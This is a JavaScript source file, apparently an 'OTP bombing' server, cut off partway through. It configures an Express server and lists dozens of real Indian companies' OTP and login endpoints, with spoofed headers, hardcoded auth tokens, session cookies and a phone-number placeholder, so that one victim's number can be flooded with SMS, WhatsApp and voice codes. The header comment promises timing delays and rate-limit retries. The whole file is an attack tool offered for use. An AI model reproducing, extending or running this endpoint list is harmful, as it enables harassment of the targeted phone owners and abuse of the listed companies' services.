// ============================================================
// api_server.js - OTP Bombing API Server (MEGA - 113 APIs)
// 28 Purani + 85 Nayi | 10min Cap | Logs | Delay | Rate Limit Retry
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;

// ============================================================
// ===== ALL APIS =====
// ============================================================

const APIS = [
    // ============================================================
    // 🟢 TIER 1 — RELIABLE (6 APIs)
    // ============================================================
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.quikr.com",
            "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },

    // ============================================================
    // 🟡 TIER 2 — PURANI WORKING (5 APIs)
    // ============================================================
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "Netmeds",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login"
        }
    },

    // ============================================================
    // 🟢 TIER 3 — NAYI WORKING (5 APIs)
    // ============================================================
    {
        name: "Vedantu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/"
        },
        data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" }
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Oyo_1",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "Ullu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    },

    // ============================================================
    // 🆕 NEW WORKING (4 APIs)
    // ============================================================
    {
        name: "Gokwik_3",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzNTg0OCwiZXhwIjoxNzU3NDM1OTA4fQ._37TKeyXUxkMEEteU2IIVeSENo8TXaNv32x5rWaJbzA",
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6ilhej3mfc"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Gokwik_4",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
            "Content-Type": "application/json",
            "gk-merchant-id": "19kc37zcdyiu"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Delhivery",
        method: "GET",
        url: "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={phone}",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        }
    },
    {
        name: "Vidyakul",
        method: "POST",
        url: "https://vidyakul.com/signup-otp/send",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data: { "_raw": "phone={phone}&rcsconsent=true" }
    },

    // ============================================================
    // ⚠️  RATE LIMIT APIS (8 APIs)
    // ============================================================
    {
        name: "Gokwik_1",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo",
            "Content-Type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" }),
        rateLimit: true
    },
    {
        name: "Gokwik_2",
        method: "POST",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        headers: {
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzQzMzc1OCwiZXhwIjoxNzU3NDMzODE4fQ._L8MBwvDff7ijaweocA302oqIA8dGOsJisPydxytvf8",
            "Content-Type": "application/json",
            "gk-merchant-id": "19an4fq2kk5y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" }),
        rateLimit: true
    },
    {
        name: "ApolloPharmacy",
        method: "POST",
        url: "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}" },
        rateLimit: true
    },
    {
        name: "Goibibo",
        method: "POST",
        url: "https://www.goibibo.com/common/downloadsms/",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mbl={phone}" },
        rateLimit: true
    },
    {
        name: "Nuvama",
        method: "POST",
        url: "https://nwaop.nuvamawealth.com/mwapi/api/Lead/GO",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ contactInfo: phone, mode: "SMS" }),
        rateLimit: true
    },
    {
        name: "Khatabook",
        method: "POST",
        url: "https://api.khatabook.com/v1/auth/request-otp",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ country_code: "+91", phone: phone, app_signature: "Jc/Zu7qNqQ2" }),
        rateLimit: true
    },
    {
        name: "Jockey",
        method: "GET",
        url: "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "accept": "*/*"
        },
        rateLimit: true
    },
    {
        name: "PharmEasy_NEW",
        method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        headers: {
            "Host": "pharmeasy.in",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
            "Accept": "*/*",
            "Content-Type": "application/json"
        },
        data: { "contactNumber": "{phone}" },
        rateLimit: true
    },

    // ============================================================
    // 🆕 85 NAYI APIs (Jo Abhi Bheji)
    // ============================================================
    {
        name: "Agrevolution",
        url: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        method: "POST",
        headers: {"Content-Type": "application/json"},
        data: (phone) => JSON.stringify({ mobile_number: phone, client_id: "kisan-app" })
    },
    {
        name: "Breeze",
        url: "https://api.breeze.in/session/start",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        data: (phone) => JSON.stringify({
            phoneNumber: phone,
            authVerificationType: "otp",
            device: { id: "A1pKVEDhlv66KLtoYsml3", platform: "Chrome", type: "Desktop" },
            countryCode: "+91"
        })
    },
    {
        name: "Gokwik",
        url: "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y"
        },
        data: (phone) => JSON.stringify({ phone: phone, country: "IN" })
    },
    {
        name: "Redcliffe",
        url: "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json"
        },
        data: (phone) => JSON.stringify({ phone_number: phone, short: true, country_code: "+91", medium: "" })
    },
    {
        name: "Penpencil_Resend",
        url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9",
            "origin": "https://www.pw.live",
            "referer": "https://www.pw.live/"
        },
        data: (phone) => JSON.stringify({ mobile: phone, organizationId: "5eb393ee95fab7468a79d189" })
    },
    {
        name: "CityMall",
        url: "https://citymall.live/api/cl-user/auth/get-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/"
        },
        data: (phone) => JSON.stringify({ phone_number: phone })
    },
    {
        name: "Licious",
        url: "https://www.licious.in/api/login/signup",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.licious.in",
            "Referer": "https://www.licious.in/"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "Bisleri",
        url: "https://apis.bisleri.com/send-otp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.bisleri.com",
            "Referer": "https://www.bisleri.com/"
        },
        data: (phone) => JSON.stringify({ mobile: phone })
    },
    {
        name: "OYO",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.oyorooms.com",
            "Referer": "https://www.oyorooms.com/"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", nod: 4 })
    },
    {
        name: "Penpencil_Register",
        url: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f"
        },
        data: (phone) => JSON.stringify({ mobile: phone, countryCode: "+91", subOrgId: "SUB-PWLI000" })
    },
    {
        name: "Zoho",
        url: "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/"
        }
    },
    {
        name: "UdyogPlus",
        url: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "MobileNumber={phone}&functionality=signup" }
    },
    {
        name: "MuthootFinance",
        url: "https://www.muthootfinance.com/smsapi.php",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.muthootfinance.com",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&pin=XjtYYEdhP0haXjo3" }
    },
    {
        name: "GoPaySense",
        url: "https://api.gopaysense.com/users/otp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.gopaysense.com",
            "referer": "https://www.gopaysense.com/"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "IIFL",
        url: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
        method: "POST",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.iifl.com",
            "referer": "https://www.iifl.com/personal-loans",
            "x-requested-with": "XMLHttpRequest"
        },
        data: { "_raw": "apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1" }
    },
    {
        name: "BankOpen",
        url: "https://v2-api.bankopen.co/users/register/otp",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "referer": "https://app.opencapital.co.in/en/onboarding/register",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        data: (phone) => JSON.stringify({ username: phone, is_open_capital: 1 })
    },
    {
        name: "TataCapital_Retail",
        url: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "referer": "https://www.tatacapital.com/"
        },
        data: (phone) => JSON.stringify({
            header: {
                authToken: "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                identifier: "nli"
            },
            body: { mobileNumber: phone }
        })
    },
    {
        name: "TradeIndia",
        url: "https://apis.tradeindia.com/app_login_api/login_app",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json"
        },
        data: (phone) => JSON.stringify({ mobile: "+91" + phone })
    },
    {
        name: "Khatabook_App",
        url: "https://api.khatabook.com/v1/auth/request-otp",
        method: "POST",
        headers: {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8"
        },
        data: (phone) => JSON.stringify({ phone: phone, country_code: "+91", app_signature: "wk+avHrHZf2" })
    },
    {
        name: "OrangeHealth",
        url: "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        method: "POST",
        headers: {
            "accept": "application/json",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "referer": "https://www.orangehealth.in/"
        },
        data: (phone) => JSON.stringify({ mobile_number: phone, customer_auto_fetch_message: true })
    },
    {
        name: "Mconnect",
        url: "https://mconnect.isteer.co/mconnect/login",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "referer": "https://mvaahna.com/"
        },
        data: (phone) => JSON.stringify({ mobile_number: "+91" + phone })
    },
    {
        name: "AstroSage",
        url: "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank",
        method: "GET",
        headers: {
            "accept": "*/*",
            "referer": "https://www.astrosage.com/"
        }
    },
    {
        name: "Spinny",
        url: "https://api.spinny.com/api/c/user/otp-request/v3/",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "platform": "web",
            "origin": "https://www.spinny.com",
            "referer": "https://www.spinny.com/"
        },
        data: (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4, "g-recaptcha-response": "" })
    },
    {
        name: "Dream11",
        url: "https://www.dream11.com/auth/passwordless/init",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "referer": "https://www.dream11.com/register",
            "x-device-identifier": "macos"
        },
        data: (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone, templateName: "default" })
    },
    {
        name: "BellaVita_OTP",
        url: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        method: "GET",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "referer": "https://bellavitaorganic.com/"
        }
    },
    {
        name: "Freedo",
        url: "https://api.freedo.rentals/customer/sendOtpForSignUp",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        data: (phone) => JSON.stringify({ email_id: "cokiwav528@avastu.com", first_name: "Haiii", mobile_number: phone })
    },
    {
        name: "Cosmofeed",
        url: "https://prod.api.cosmofeed.com/api/user/authenticate",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "referer": "https://superprofile.bio/"
        },
        data: (phone) => JSON.stringify({ phoneNumber: phone, countryCode: "+91", data: { email: "abcd2@gmail.com" }, authScreen: "signup-screen", userIsConvertingToCreator: false })
    },
    {
        name: "Evital",
        url: "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        method: "POST",
        headers: {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/"
        },
        data: (phone) => JSON.stringify({ pharmacy_name: "hfhfjfgfhkf", mobile: phone, referral_code: "", email_id: "jhvd@gmail.com", zip_code: "110086", device_id: "f2cea99f-381d-432d-bd27-02bc6678fa93", app_version: "desktop", device_name: "Chrome", device_model: "Mozilla/5.0", device_manufacture: "Windows", device_release: "windows-10", device_sdk_version: "126.0.0.0" })
    },
    {
        name: "Clovia",
        url: "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=true&token",
        method: "GET",
        headers: {
            "accept": "application/json, text/plain, */*",
            "cookie": "comp_par=\"utm_campaign=70553\\054firstclicktime=2024-06-23 17:18:10.351125\\054utm_medium=ppc\\054http_referer=https://www.google.com/\\054utm_source=10001\"; cr_id_last=None; last_source_time=\"2024-06-23 17:18:10.351039\"; last_source=10001; nur=None; sessionid=2kp1dzotrgpe698bfanq4tp4qechv2ln",
            "referer": "https://www.clovia.com/?utm_source=10001&utm_medium=ppc&utm_term=clovia_brand&utm_campaign=70553"
        }
    },
    {
        name: "Brevistay",
        url: "https://www.brevistay.com/cst/app-api/login",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "origin": "https://www.brevistay.com",
            "referer": "https://www.brevistay.com/login?red=/hotels-in-lucknow"
        },
        data: (phone) => JSON.stringify({ is_otp: 1, is_password: 0, mobile: phone })
    },
    {
        name: "HourlyRooms",
        url: "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        method: "POST",
        headers: {
            "Accept": "*/*",
            "access-control-allow-credentials": "true",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "Origin": "https://hourlyrooms.co.in"
        },
        data: (phone) => JSON.stringify({ phone: phone })
    },
    {
        name: "BharatLoan",
        url: "https://www.bharatloan.com/login-sbm",
        method: "POST",
        headers: {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "X-Requested-With": "XMLHttpRequest"
        },
        data: { "_raw": "mobile={phone}&current_page=login&is_existing_customer=2" }
    },
    {
        name: "Pagarbook",
        url: "https://api.pagarbook.com/api/v5/auth/otp/request",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "referer": "https://web.pagarbook.com/",
            "userrole": "EMPLOYER"
        },
        data: (phone) => JSON.stringify({ phone: phone, language: 1 })
    },
    {
        name: "55Club",
        url: "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        method: "POST",
        headers: {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "referer": "https://55club08.in/"
        },
        data: (phone) => JSON.stringify({ phone: "91" + phone, codeType: 1, language: 0, random: "35ae48f136d74b279dbd0eeb2504e7f8", signature: "78A2879A0D46B65D257F9B29354B5DBA", timestamp: 1715445820 })
    },
    {
        name: "Zerodha",
        url: "https://zerodha.com/account/registration.php",
        method: "POST",
        headers: {
            "accept": "*/*",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://zerodha.com",
            "referer": "https://zerodha.com/"
        },
